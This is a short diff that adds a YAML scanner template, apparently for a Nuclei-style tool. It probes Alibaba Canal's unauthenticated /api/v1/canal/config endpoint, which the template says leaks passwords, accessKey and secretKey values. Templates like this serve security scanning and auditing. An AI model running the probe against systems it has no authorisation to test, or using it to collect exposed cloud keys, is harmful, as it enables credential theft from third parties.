@@ -1,0 +1,18 @@
+id: alibaba-canal-config----------
+info:
+  author: pocscanner
+  description: 由于/api/v1/canal/config  未进行权限验证可直接访问，导致账户密码、accessKey、secretKey等一系列敏感信息泄露
+  name: Alibaba Canal config 云密钥信息泄露漏洞
+  reference: []
+  severity: medium
+requests:
+- matchers:
+  - status:
+    - 200
+    - 301
+    - 302
+    - 403
+    type: status
+  method: GET
+  path:
+  - '{{BaseURL}}/api/v1/canal/config/1/0'
